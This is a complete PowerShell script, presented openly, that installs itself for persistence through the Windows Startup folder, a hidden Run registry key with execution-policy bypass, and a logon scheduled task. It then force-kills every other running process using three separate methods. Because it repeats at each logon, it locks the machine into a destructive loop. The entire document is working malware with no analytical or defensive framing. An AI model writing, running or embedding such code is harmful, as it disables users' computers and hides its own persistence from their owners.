# Sets itself to run at Windows startup and terminates all processes when executed

$ScriptPath = $MyInvocation.MyCommand.Path
$StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ProcessKiller.ps1"

function Install-Startup {
    # add script to startup folder
    if ($ScriptPath -ne $StartupPath) {
        try {
            Copy-Item $ScriptPath $StartupPath -Force
            
            # registry entry for additional persistence
            $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            $RegName = "ProcessKiller"
            $RegValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$StartupPath`""
            Set-ItemProperty -Path $RegPath -Name $RegName -Value $RegValue -Force
            
            # scheduled task for maximum persistence
            $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$StartupPath`""
            $Trigger = New-ScheduledTaskTrigger -AtLogOn
            $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
            Register-ScheduledTask -TaskName "ProcessKiller" -Action $Action -Trigger $Trigger -Settings $Settings -Force 2>$null
        } catch { }
    }
}

function Kill-AllProcesses {
    Get-Process | Where-Object Id -ne $PID | Stop-Process -Force -ErrorAction 0
    Get-WmiObject Win32_Process | Where-Object ProcessId -ne $PID | ForEach-Object { $_.Terminate() } 2>$null
    cmd /c "taskkill /f /fi `"PID ne $PID`" 2>nul" | Out-Null
}

Install-Startup
Kill-AllProcesses
